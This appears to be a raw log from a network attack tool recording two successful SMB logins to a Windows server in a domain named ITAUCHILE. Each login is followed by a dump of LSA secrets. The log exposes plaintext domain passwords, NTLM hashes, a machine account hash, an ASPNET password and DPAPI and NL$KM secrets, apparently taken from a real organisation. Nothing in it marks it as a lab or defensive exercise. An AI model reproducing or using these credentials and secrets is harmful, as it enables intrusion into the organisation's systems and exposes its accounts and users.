12-22-2020 19:27:51 [*] PREVIRTUAL003.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL003) (domain:ITAUCHILE)
12-22-2020 19:27:51 [+] PREVIRTUAL003.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:27:56 [+] PREVIRTUAL003.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:28:01 CRPA3630:c3ce8837d2d7abf42a33dbf1a5d451c1:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:28:02 CRPA3640:1e4bf123eb2d918a74e20c4fefa6d82d:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:28:03 CRPA3400:6645dd2b24a6a86cc5495ac4a345feb7:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:28:06 ITAUCHILE\PREVIRTUAL003$:aad3b435b51404eeaad3b435b51404ee:2b575d85f7415e0c00333f4e0d8da9ed:::
12-22-2020 19:28:07 ASPNET: z@|#4-H76v,}0N
12-22-2020 19:28:09 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:28:11 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:34:34 [*] PREVIRTUAL003.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL003) (domain:ITAUCHILE)
12-22-2020 21:34:35 [+] PREVIRTUAL003.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:34:40 [+] PREVIRTUAL003.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:34:44 CRPA3630:c3ce8837d2d7abf42a33dbf1a5d451c1:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:34:45 CRPA3640:1e4bf123eb2d918a74e20c4fefa6d82d:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:34:46 CRPA3400:6645dd2b24a6a86cc5495ac4a345feb7:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:34:49 ITAUCHILE\PREVIRTUAL003$:aad3b435b51404eeaad3b435b51404ee:2b575d85f7415e0c00333f4e0d8da9ed:::
12-22-2020 21:34:50 ASPNET: z@|#4-H76v,}0N
12-22-2020 21:34:53 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:34:54 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
